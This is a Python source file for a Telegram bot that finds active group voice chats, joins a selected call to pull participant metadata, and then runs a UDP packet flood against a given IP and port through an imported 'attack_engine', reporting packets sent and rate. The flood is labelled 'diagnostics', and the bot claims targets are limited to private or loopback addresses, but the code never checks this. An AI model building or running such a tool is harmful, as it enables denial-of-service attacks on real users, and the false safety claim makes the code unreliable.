"""Telegram bot controller and state machine."""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

from pyrogram import Client, filters
from pyrogram.errors import FloodWait
from pyrogram.handlers import CallbackQueryHandler, MessageHandler
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from attack_engine import AttackEngine
from utils import human_bytes, is_valid_port
from vc_detector import VCDetector, VCRecord

LOGGER = logging.getLogger(__name__)


class BotState(str, Enum):
    IDLE = "IDLE"
    SCANNING = "SCANNING"
    SELECTION = "SELECTION"
    JOINING = "JOINING"
    READY = "READY"
    ATTACKING = "ATTACKING"


@dataclass
class SessionContext:
    state: BotState = BotState.IDLE
    active_records: list[VCRecord] = field(default_factory=list)
    selected_record: Optional[VCRecord] = None
    extracted_metadata: Optional[dict] = None
    progress_task: Optional[asyncio.Task] = None


class BotHandler:
    def __init__(self, bot: Client, detector: VCDetector, engine: AttackEngine, admin_id: int, max_duration: int) -> None:
        self.bot = bot
        self.detector = detector
        self.engine = engine
        self.admin_id = admin_id
        self.max_duration = max_duration
        self.ctx = SessionContext()

        self.bot.add_handler(MessageHandler(self.on_scan, filters.command("scan") & filters.user(admin_id)))
        self.bot.add_handler(MessageHandler(self.on_stop, filters.command("stop") & filters.user(admin_id)))
        self.bot.add_handler(CallbackQueryHandler(self.on_callback, filters.user(admin_id)))

    async def on_scan(self, client: Client, message):
        self.ctx.state = BotState.SCANNING
        status = await message.reply("🔎 Scanning top dialogs for active voice chats...")
        try:
            records = await self.detector.scan_active_voice_chats(limit=50)
        except FloodWait as wait_err:
            await status.edit_text(f"⚠️ FloodWait: retry after {wait_err.value} seconds.")
            self.ctx.state = BotState.IDLE
            return

        self.ctx.active_records = records
        if not records:
            await status.edit_text("No active voice chats found.")
            self.ctx.state = BotState.IDLE
            return

        buttons = [[InlineKeyboardButton(f"{idx + 1}. {item.title[:40]}", callback_data=f"select:{idx}")] for idx, item in enumerate(records)]
        await status.edit_text("Select a group with active VC:", reply_markup=InlineKeyboardMarkup(buttons))
        self.ctx.state = BotState.SELECTION

    async def on_stop(self, client: Client, message):
        self.engine.stop()
        if self.ctx.progress_task:
            self.ctx.progress_task.cancel()
            self.ctx.progress_task = None
        self.ctx.state = BotState.IDLE
        await message.reply("🛑 Global stop requested. All tasks halted.")

    async def on_callback(self, client: Client, callback_query):
        data = callback_query.data or ""
        if data.startswith("select:"):
            index = int(data.split(":", 1)[1])
            self.ctx.selected_record = self.ctx.active_records[index]
            await callback_query.message.edit_text(
                f"Join VC and extract metadata for '{self.ctx.selected_record.title}'?",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("✅ PROCEED", callback_data="join:yes"), InlineKeyboardButton("❌ CANCEL", callback_data="join:no")]]
                ),
            )
            await callback_query.answer()
            return

        if data == "join:no":
            self.ctx.state = BotState.IDLE
            await callback_query.message.edit_text("Cancelled.")
            await callback_query.answer()
            return

        if data == "join:yes" and self.ctx.selected_record:
            self.ctx.state = BotState.JOINING
            try:
                metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
                self.ctx.extracted_metadata = metadata
                self.ctx.state = BotState.READY
                await callback_query.message.edit_text(
                    "Metadata extracted.\n"
                    "For safety, diagnostics can run only against private/loopback IP targets.\n"
                    "Use: /diag <ip> <port> <duration>",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Leave VC", callback_data="leave")]]),
                )
            except Exception as exc:
                self.ctx.state = BotState.IDLE
                await callback_query.message.edit_text(f"Join failed: {exc}")
            await callback_query.answer()
            return

        if data == "global_stop":
            self.engine.stop()
            self.ctx.state = BotState.READY
            await callback_query.answer("Stop signal sent")
            return

        if data == "leave" and self.ctx.selected_record:
            await self.detector.leave_call(self.ctx.selected_record)
            self.ctx.state = BotState.IDLE
            await callback_query.message.edit_text("Left VC and returned to idle state.")
            await callback_query.answer()

    def register_diag_command(self):
        self.bot.add_handler(MessageHandler(self.on_diag, filters.command("diag") & filters.user(self.admin_id)))

    async def on_diag(self, client: Client, message):
        args = message.text.split()
        if len(args) != 4:
            await message.reply("Usage: /diag <ip> <port> <duration_seconds>")
            return

        ip = args[1]
        port = int(args[2])
        duration = min(int(args[3]), self.max_duration)
        if not is_valid_port(port):
            await message.reply("Invalid port.")
            return

        self.ctx.state = BotState.ATTACKING
        dashboard = await message.reply("Starting diagnostics...")
        self.ctx.progress_task = asyncio.create_task(self._progress_loop(dashboard.chat.id, dashboard.id))

        try:
            await self.engine.run_udp_test(ip=ip, port=port, duration=duration)
        except Exception as exc:
            await dashboard.edit_text(f"Diagnostics failed: {exc}")
        finally:
            if self.ctx.progress_task:
                self.ctx.progress_task.cancel()
                self.ctx.progress_task = None
            stats = self.engine.stats
            await dashboard.edit_text(
                "Diagnostics completed.\n"
                f"Sent={stats.sent_packets} Failed={stats.failed_packets}\n"
                f"Data={human_bytes(stats.bytes_sent)} RPS={stats.rps:.2f}"
            )
            self.ctx.state = BotState.READY

    async def _progress_loop(self, chat_id: int, message_id: int):
        while True:
            await asyncio.sleep(5)
            stats = self.engine.stats
            try:
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=(
                        "📊 Live Progress\n"
                        f"Data Sent: {human_bytes(stats.bytes_sent)}\n"
                        f"Packets: {stats.sent_packets} success / {stats.failed_packets} failed\n"
                        f"RPS: {stats.rps:.2f}"
                    ),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Global Stop", callback_data="global_stop")]]),
                )
            except Exception:
                pass
